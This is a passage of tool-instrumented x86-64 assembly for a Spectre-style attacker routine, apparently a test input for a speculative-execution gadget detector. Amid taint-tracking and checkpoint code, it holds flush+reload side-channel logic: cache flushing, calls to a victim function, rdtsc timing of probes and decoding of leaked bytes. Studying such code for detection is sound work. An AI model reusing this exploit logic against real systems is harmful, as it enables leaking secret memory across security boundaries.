            jne .L__ret_transform_target_attacker_function__4657c448_5658_48f1_aed9_4ee4ad5a94b3__teapot__

            cmpq $-1,%rax
            leaq (.__trampoline__4657c448_5658_48f1_aed9_4ee4ad5a94b3__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1108)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__4657c448_5658_48f1_aed9_4ee4ad5a94b3__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1108:

            nop
            je .L_191e

            movq %rax,%r15
            movl $1048576,%edx
            movl $1,%esi
            movq %rax,%rdi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb (%r12),%r14b
            movb %r14b,15(%r12)
            movw $0,3(%r12)
            movb %r14b,5(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            callq memset__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__97097815_8786_468c_bb16_b0f19021c1db__teapot__

            movl $0,%eax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb $0,(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            callq calibrate_latency

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__e07ba195_f6ea_44a3_aaeb_75ef67146022__teapot__

            movq %rax,%r14
            leaq (.L_2130)(%rip),%rdi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb (%r12),%r13b
            movb %r13b,14(%r12)
            movb $0,5(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            callq puts@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__fc56e38b_81e5_44ac_835e_d465fc6a59b5__teapot__

            leaq 96(%rsp),%rdi
            movl $256,%ecx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb 6(%r12),%sil
            movb %sil,5(%r12)
            movb $0,2(%r12)
            movb $0,(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $0,%eax

            rep stosq (%rdi)

            leaq 2151(%rsp),%r12
            movq %r12,(scratchpad)
            movb $0,2151(%rsp)
            leaq 88(%rsp),%r12
            movq %r12,(scratchpad+8)
            movq 88(%rsp),%rbx
            leaq 72(%rsp),%r12
            movq %r12,(scratchpad+16)
            movq 72(%rsp),%r13
            movq %r13,%rbp
            subq %rbx,%rbp
            leaq 16(%rsp),%r12
            movq %r12,(scratchpad+24)
            movq %rbp,16(%rsp)
            movq %rbx,%rcx
            movq %r13,%rdx
            leaq (.L_2160)(%rip),%rsi
            movl $1,%edi
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            movq %rsi,(scratchpad+524312)
            movabsq $dift_reg_tags,%r12
            movb 6(%r12),%al
            movabsq $scratchpad,%rdx
            movabsq $35184372088832,%rbx
            movq (%rdx),%rsi
            xorq %rbx,%rsi
            movb %al,(%rsi)
            movb 6(%r12),%al
            movq 8(%rdx),%rsi
            xorq %rbx,%rsi
            movb (%rsi),%sil
            movl %esi,%ecx
            orb %al,%cl
            movb %cl,1(%r12)
            movq 16(%rdx),%rcx
            xorq %rbx,%rcx
            orb (%rcx),%al
            movb %al,13(%r12)
            orb %sil,%al
            movb %al,7(%r12)
            xorq 24(%rdx),%rbx
            movzbl %al,%eax
            movabsq $72340172838076673,%rcx
            imulq %rax,%rcx
            movq %rcx,(%rbx)
            movb 1(%r12),%al
            movb 13(%r12),%cl
            movb %al,2(%r12)
            movb %cl,3(%r12)
            movw $0,4(%r12)
            movq (scratchpad+524312),%rsi
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__3543858f_250f_4b04_949b_486380d30134__teapot__

            movq %rbp,%r8
            movq %rbx,%rcx
            movq %r13,%rdx
            leaq (.L_2188)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movabsq $dift_reg_tags,%r12
            movb 1(%r12),%al
            movb 7(%r12),%r13b
            movb %r13b,8(%r12)
            movb %al,2(%r12)
            movb 13(%r12),%al
            movb %al,3(%r12)
            movw $0,4(%r12)
            movb $0,(%r12)
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__d1b90268_6450_4902_b730_b1f93ab1ed91__teapot__

            leaq (.L_2130)(%rip),%rdi
            movabsq $dift_reg_tags,%r12
            movb $0,5(%r12)
            callq puts@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__9c5af263_c596_4a94_837d_62fb05aa069a__teapot__

            leaq (array_size)(%rip),%r12
            movq %r12,(scratchpad)
            movl (array_size)(%rip),%eax
            leal -1(%rax),%ebx
            leaq 24(%rsp),%r12
            movq %r12,(scratchpad+8)
            movq %rbx,24(%rsp)
            leaq (array_size)(%rip),%r12
            movq %r12,(scratchpad+16)
            movl (array_size)(%rip),%eax
            shrl $1,%eax
            movl %eax,%eax
            leaq 8(%rsp),%r12
            movq %r12,(scratchpad+24)
            movq %rax,8(%rsp)
            leaq 1(%rbp),%rax
            leaq 32(%rsp),%r12
            movq %r12,(scratchpad+32)
            movq %rax,32(%rsp)
            leaq 48(%rsp),%r12
            movq %r12,(scratchpad+40)
            movl %ebp,48(%rsp)
            leaq 52(%rsp),%r12
            movq %r12,(scratchpad+48)
            movl %eax,52(%rsp)
            movl $90,%edx
            movl %ebp,%esi
            movl %eax,%edi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rax,(scratchpad+524328)
            lahf 
            seto %al
            movq %rax,(scratchpad+524320)
            movq (scratchpad+524328),%rax
            movabsq $scratchpad,%rdx
            movabsq $35184372088832,%rbp
            movq (%rdx),%r13
            xorq %rbp,%r13
            movb (%r13),%bl
            movabsq $dift_reg_tags,%rax
            movb %bl,(%rax)
            movb %bl,1(%rax)
            orb 6(%rax),%bl
            movq 8(%rdx),%r12
            xorq %rbp,%r12
            movzbl %bl,%ebx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rbx
            movq %rbx,(%r12)
            movq 16(%rdx),%rbx
            xorq %rbp,%rbx
            movb 6(%rax),%r13b
            orb (%rbx),%r13b
            movq 24(%rdx),%rbx
            xorq %rbp,%rbx
            movzbl %r13b,%r13d
            imulq %rcx,%r13
            movq %r13,(%rbx)
            movb 7(%rax),%r13b
            movb %r13b,(%rax)
            orb 6(%rax),%r13b
            movq 32(%rdx),%rbx
            xorq %rbp,%rbx
            movzbl %r13b,%r13d
            imulq %rcx,%r13
            movq %r13,(%rbx)
            movb 6(%rax),%r13b
            orb 7(%rax),%r13b
            movq 40(%rdx),%rbx
            xorq %rbp,%rbx
            movzbl %r13b,%r13d
            imull $16843009,%r13d,%r13d
            movl %r13d,(%rbx)
            movb (%rax),%r13b
            orb 6(%rax),%r13b
            xorq 48(%rdx),%rbp
            movzbl %r13b,%r13d
            imull $16843009,%r13d,%r13d
            movl %r13d,(%rbp)
            movb $0,3(%rax)
            movb (%rax),%r13b
            movb 7(%rax),%bpl
            movb %bpl,4(%rax)
            movb %r13b,5(%rax)
            movq %rax,(scratchpad+524328)
            movq (scratchpad+524320),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524328),%rax
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            callq otherArray_init

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__890c0f0d_6768_4b90_aebd_2c5982c3de2f__teapot__

            leaq 40(%rsp),%r12
            movq %r12,(scratchpad)
            movq %rax,40(%rsp)
            movl $0,%edx
            leaq 64(%rsp),%r12
            movq %r12,(scratchpad+8)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%rdi
            movb (%rdi),%al
            orb 6(%rdi),%al
            movabsq $scratchpad,%r13
            movabsq $35184372088832,%r12
            movq (%r13),%rbp
            xorq %r12,%rbp
            movzbl %al,%eax
            movabsq $72340172838076673,%rsi
            imulq %rsi,%rax
            movq %rax,(%rbp)
            movb $0,3(%rdi)
            movb 1(%rdi),%al
            orb 6(%rdi),%al
            xorq 8(%r13),%r12
            movzbl %al,%edi
            imulq %rsi,%rdi
            movq %rdi,(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rbx,64(%rsp)
.L_18e1:

            movq $-1,%rcx
            leaq 72(%rsp),%r12
            movq %r12,(scratchpad)
            movq 72(%rsp),%rdi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb $0,2(%r12)
            movabsq $scratchpad,%r13
            movabsq $35184372088832,%rsi
            xorq (%r13),%rsi
            movb (%rsi),%r13b
            orb 6(%r12),%r13b
            movb %r13b,5(%r12)
            movb $0,(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $0,%eax

            repne scasb (%rdi),%al

            movq %rcx,%rax
            notq %rax
            subq $1,%rax
            cmpq %rdx,%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb 2(%r12),%sil
            movb %sil,(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq (.__trampoline__ee029a32_d540_450c_8c2f_ddab3cb38004__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1141)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__ee029a32_d540_450c_8c2f_ddab3cb38004__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1141:

            nop
            jbe .L_1acf

            testq %rdx,%rdx
            leaq (.__trampoline__479025d9_6ebc_4cf3_a8d3_04093a6b7dc9__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1142)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__479025d9_6ebc_4cf3_a8d3_04093a6b7dc9__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1142:

            nop
            jne .L_1acf

            leaq 56(%rsp),%r12
            movq %r12,(scratchpad)
            movq $100,56(%rsp)
            movabsq $dift_reg_tags,%r12
            movzbl 6(%r12),%r12d
            movabsq $scratchpad,%r13
            movabsq $35184372088832,%rsi
            xorq (%r13),%rsi
            movabsq $72340172838076673,%r13
            imulq %r12,%r13
            movq %r13,(%rsi)
            jmp .L_19cd
.L_191e:

            leaq (.L_206f)(%rip),%rdi
            movabsq $dift_reg_tags,%r12
            movb $0,5(%r12)
            callq perror@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__badd2d8b_82e0_47b4_bbbf_7d20a8f1e6b3__teapot__

            jmp .L_1b0e
.L_192f:

            movl $13,%esi
            movabsq $dift_reg_tags,%r12
            movb $0,4(%r12)
            jmp .L_1985
.L_1936:

            mfence 
            lfence 
            rdtsc 
            shlq $32,%rdx
            orq %rdx,%rax
            lfence 
            movq %rax,%r8
            movq %rdi,%rax
            shlq $12,%rax
            addq %r15,%rax
            leaq (%rax),%r12
            movq %r12,(scratchpad)
            movb (%rax),%al
            rdtscp 
            shlq $32,%rdx
            orq %rdx,%rax
            lfence 
            subq %r8,%rax
            cmpq %rax,%r14
            setae %al
            movzbl %al,%eax
            leaq 96(%rsp,%rdi,8),%r12
            movq %r12,(scratchpad+8)
            movabsq $dift_reg_tags,%r12
            movb $0,8(%r12)
            movb $0,(%r12)
            movw $0,2(%r12)
            movb 5(%r12),%bpl
            orb 6(%r12),%bpl
            movabsq $scratchpad,%r12
            movabsq $35184372088832,%r13
            xorq 8(%r12),%r13
            orb (%r13),%bpl
            movzbl %bpl,%r12d
            movabsq $72340172838076673,%rbp
            imulq %r12,%rbp
            movq %rbp,(%r13)
            addq %rax,96(%rsp,%rdi,8)
.L_1975:

            addq $167,%rsi
            cmpq $42765,%rsi
            leaq (.__trampoline__2d8b2904_dc58_4a0a_bf26_858b40035890__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1151)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__2d8b2904_dc58_4a0a_bf26_858b40035890__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1151:

            nop
            je .L_1991
.L_1985:

            movzbl %sil,%edi
            cmpb $90,%sil
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb 4(%r12),%r13b
            movb %r13b,5(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq (.__trampoline__3a392698_d00d_43c5_a4bb_0b58dafc3b41__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1153)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__3a392698_d00d_43c5_a4bb_0b58dafc3b41__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1153:

            nop
            jne .L_1936

            jmp .L_1975
.L_1991:

            leaq 88(%rsp),%r12
            movq %r12,(scratchpad)
            movq 88(%rsp),%rdi
            movabsq $scratchpad,%r12
            movabsq $35184372088832,%r13
            xorq (%r12),%r13
            movb (%r13),%r12b
            movabsq $dift_reg_tags,%r13
            orb 6(%r13),%r12b
            movb %r12b,5(%r13)
            callq free@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__b2ead161_26db_4715_aabe_0cdf4bc90288__teapot__

            movl $0,%eax
            movabsq $dift_reg_tags,%r12
            movb $0,(%r12)
            callq array_init

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__deb7c6f2_21d5_4961_84b4_5f92cf40e671__teapot__

            leaq 88(%rsp),%r12
            movq %r12,(scratchpad)
            movq %rax,88(%rsp)
            movl $90,%edx
            leaq 48(%rsp),%r12
            movq %r12,(scratchpad+8)
            movl 48(%rsp),%esi
            leaq 52(%rsp),%r12
            movq %r12,(scratchpad+16)
            movl 52(%rsp),%edi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movabsq $dift_reg_tags,%rbp
            movb (%rbp),%bl
            orb 6(%rbp),%bl
            movabsq $scratchpad,%r12
            movabsq $35184372088832,%rax
            movq (%r12),%r13
            xorq %rax,%r13
            movzbl %bl,%ebx
            movabsq $72340172838076673,%rcx
            imulq %rbx,%rcx
            movq %rcx,(%r13)
            movb $0,3(%rbp)
            movb 6(%rbp),%bl
            movq 8(%r12),%rcx
            xorq %rax,%rcx
            movb (%rcx),%cl
            orb %bl,%cl
            movb %cl,4(%rbp)
            xorq 16(%r12),%rax
            orb (%rax),%bl
            movb %bl,5(%rbp)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            callq otherArray_init

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__31500b1f_dd7d_45c8_8bf8_60e62467f1b2__teapot__

            leaq 40(%rsp),%r12
            movq %r12,(scratchpad)
            movq %rax,40(%rsp)
            leaq 56(%rsp),%r12
            movq %r12,(scratchpad+8)
            subq $1,56(%rsp)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%rbp
            movb (%rbp),%dil
            orb 6(%rbp),%dil
            movabsq $scratchpad,%rsi
            movabsq $35184372088832,%r12
            movq (%rsi),%rdx
            xorq %r12,%rdx
            movzbl %dil,%edi
            movabsq $72340172838076673,%r13
            imulq %r13,%rdi
            movq %rdi,(%rdx)
            xorq 8(%rsi),%r12
            movb (%r12),%dil
            orb 6(%rbp),%dil
            movzbl %dil,%ebp
            imulq %r13,%rbp
            movq %rbp,(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq (.__trampoline__31500b1f_dd7d_45c8_8bf8_60e62467f1b2__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1167)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__31500b1f_dd7d_45c8_8bf8_60e62467f1b2__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1167:

            nop
            je .L_1a9b
.L_19cd:

            movl $256,%edx
            movl $4096,%esi
            movq %r15,%rdi
            movabsq $dift_reg_tags,%r12
            movw $0,3(%r12)
            movb 15(%r12),%r13b
            movb %r13b,5(%r12)
            callq flush_lines

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__b19b3c19_e5c0_4fd6_8f50_eef720d5cc77__teapot__

            clflush (array_size)(%rip)
            leaq 64(%rsp),%r12
            movq %r12,(scratchpad)
            movq 64(%rsp),%r12
            leaq 8(%rsp),%rsi
            movq %rsi,(scratchpad+8)
            movq 8(%rsp),%rbx
            movl $0,%ebp
            leaq 88(%rsp),%rax
            leaq (%rsp),%rsi
            movq %rsi,(scratchpad+16)
            movabsq $dift_reg_tags,%rdi
            movzbl 6(%rdi),%ecx
            movabsq $scratchpad,%rdx
            movabsq $35184372088832,%rsi
            movq (%rdx),%r8
            xorq %rsi,%r8
            movb (%r8),%r13b
            orb %cl,%r13b
            movb %r13b,12(%rdi)
            movq 8(%rdx),%r13
            xorq %rsi,%r13
            movb (%r13),%r13b
            orb %cl,%r13b
            movb %r13b,1(%rdi)
            movb $0,7(%rdi)
            movb %cl,(%rdi)
            xorq 16(%rdx),%rsi
            movabsq $72340172838076673,%rdi
            imulq %rcx,%rdi
            movq %rdi,(%rsi)
            movq %rax,(%rsp)
.L_19fe:

            mfence 
            lfence 
            movl %r12d,%r8d
            movl $4096,%ecx
            movl %ebx,%edx
            movq %r15,%rsi
            leaq (%rsp),%r12
            movq %r12,(scratchpad)
            movq (%rsp),%rdi
            movabsq $dift_reg_tags,%r12
            movb 1(%r12),%bl
            movb 12(%r12),%r13b
            movb %r13b,8(%r12)
            movb $0,2(%r12)
            movb %bl,3(%r12)
            movb 15(%r12),%bl
            movb %bl,4(%r12)
            movabsq $scratchpad,%rbx
            movabsq $35184372088832,%r13
            xorq (%rbx),%r13
            movb (%r13),%bl
            orb 6(%r12),%bl
            movb %bl,5(%r12)
            callq victim_function

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__c362d663_c2e2_43fc_a017_845a8fca99b0__teapot__

            xorq %rax,%rax
            addq $1,%rbp
            cmpq $32,%rbp
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb $0,(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq (.__trampoline__c362d663_c2e2_43fc_a017_845a8fca99b0__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1178)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__c362d663_c2e2_43fc_a017_845a8fca99b0__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1178:

            nop
            je .L_192f

            movq %rbp,%r13
            andl $31,%r13d
            cmpq $31,%r13
            sete %al
            movzbl %al,%eax
            movq %rax,%rdx
            negq %rdx
            subq $1,%rax
            leaq 32(%rsp),%r12
            movq %r12,(scratchpad)
            movq 32(%rsp),%r12
            andq %rdx,%r12
            leaq 24(%rsp),%rcx
            movq %rcx,(scratchpad+8)
            movq 24(%rsp),%rcx
            andq %rax,%rcx
            orq %rcx,%r12
            leaq 16(%rsp),%rdi
            movq %rdi,(scratchpad+16)
            andq 16(%rsp),%rdx
            leaq 8(%rsp),%rdi
            movq %rdi,(scratchpad+24)
            andq 8(%rsp),%rax
            movq %rdx,%rbx
            orq %rax,%rbx
            movl $256,%edx
            movl $4096,%esi
            movq %r15,%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rsi,(scratchpad+524320)
            movq %rdi,(scratchpad+524328)
            movabsq $dift_reg_tags,%rsi
            movb 6(%rsi),%dil
            movb 7(%rsi),%bl
            movb %bl,13(%rsi)
            movb $0,(%rsi)
            movb $0,3(%rsi)
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rax
            movq (%rcx),%rdx
            xorq %rax,%rdx
            movb (%rdx),%bl
            orb %dil,%bl
            movb %bl,12(%rsi)
            movq 8(%rcx),%rdx
            xorq %rax,%rdx
            movb (%rdx),%dl
            orb %dl,%bl
            orb %dil,%dl
            movb %dl,2(%rsi)
            movb %bl,12(%rsi)
            movq 16(%rcx),%rbx
            xorq %rax,%rbx
            movb (%rbx),%dl
            movl %edx,%ebx
            orb %dil,%bl
            movb %bl,3(%rsi)
            xorq 24(%rcx),%rax
            orb (%rax),%dil
            movb %dil,(%rsi)
            orb %dl,%dil
            movb %dil,1(%rsi)
            movw $0,3(%rsi)
            movb 15(%rsi),%dil
            movb %dil,5(%rsi)
            movq (scratchpad+524328),%rdi
            movq (scratchpad+524320),%rsi
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            callq flush_lines

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__a443664a_f1ad_4fd9_a559_5be26ad24f64__teapot__

            clflush (array_size)(%rip)
            cmpq $31,%r13
            leaq (.__trampoline__a443664a_f1ad_4fd9_a559_5be26ad24f64__teapot__)(%rip),%r13
            movq %r13,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1185)(%rip),%r13
            movq %r13,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__a443664a_f1ad_4fd9_a559_5be26ad24f64__teapot__)(%rip),%r13
            movq %r13,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1185:

            nop
            jne .L_19fe

            leaq 40(%rsp),%r13
            movq %r13,(scratchpad)
            movq 40(%rsp),%rdi
            movq %rax,(scratchpad+524288)
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%r13
            xorq (%rax),%r13
            movb (%r13),%al
            movabsq $dift_reg_tags,%r13
            orb 6(%r13),%al
            movb %al,5(%r13)
            movq (scratchpad+524288),%rax
            callq free@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__2e9de1b0_585c_40d0_8ab4_6120d11623c7__teapot__

            jmp .L_19fe
.L_1a9b:

            leaq 96(%rsp),%rbx
            leaq 2151(%rsp),%rdi
            movl $256,%edx
            movq %rbx,%rsi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb 6(%r12),%r13b
            movb %r13b,1(%r12)
            movb %r13b,5(%r12)
            movb $0,3(%r12)
            movb %r13b,4(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            callq decode_flush_reload_state

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__17d14e56_80cb_4e8d_a489_136d21f4f9e1__teapot__

            movl $256,%ecx
            movl $0,%eax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb $0,2(%r12)
            movb $0,(%r12)
            movb 1(%r12),%sil
            movb %sil,5(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rbx,%rdi

            rep stosq (%rdi)

            movl $1,%edx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $dift_reg_tags,%r12
            movb $0,3(%r12)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            jmp .L_18e1
.L_1acf:

            leaq 2151(%rsp),%rdx
            leaq (.L_2074)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movabsq $dift_reg_tags,%r12
            movb 6(%r12),%r14b
            movb %r14b,3(%r12)
            movw $0,4(%r12)
            movb $0,(%r12)
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__13b3779c_7e9b_497c_8dd8_ff2fcc636f0e__teapot__

            movl $1048576,%esi
            movq %r15,%rdi
            movabsq $dift_reg_tags,%r12
            movb $0,4(%r12)
            movb 15(%r12),%r15b
            movb %r15b,5(%r12)
            callq munmap@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__5ac66119_87dd_4238_aef1_89b82b8fe153__teapot__

            leaq 88(%rsp),%r12
            movq %r12,(scratchpad)
            movq 88(%rsp),%rdi
            movabsq $scratchpad,%r12
            movabsq $35184372088832,%r15
            xorq (%r12),%r15
            movb (%r15),%r12b
            movabsq $dift_reg_tags,%r15
            orb 6(%r15),%r12b
            movb %r12b,5(%r15)
            callq free@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__83be127e_d615_4a37_9c06_e378055b2db2__teapot__

            leaq 72(%rsp),%r12
            movq %r12,(scratchpad)
            movq 72(%rsp),%rdi
            movabsq $scratchpad,%r12
            movabsq $35184372088832,%r15
            xorq (%r12),%r15
            movb (%r15),%r12b
            movabsq $dift_reg_tags,%r15
            orb 6(%r15),%r12b
            movb %r12b,5(%r15)
            callq free@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_attacker_function__0123dae6_c74c_479f_8df9_d4585205bbe3__teapot__
.L_1b0e:

            leaq 2152(%rsp),%r12
            movq %r12,(scratchpad)
            movq 2152(%rsp),%rax
            leaq %fs:40,%r12
            movq %r12,(scratchpad+8)
            xorq %fs:40,%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movabsq $scratchpad,%r12
            movabsq $35184372088832,%r14
            movq (%r12),%r15
            xorq %r14,%r15
            movb (%r15),%r15b
            movabsq $dift_reg_tags,%r13
            orb 6(%r13),%r15b
            movb %r15b,(%r13)
            xorq 8(%r12),%r14
            orb (%r14),%r15b
            movb %r15b,(%r13)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
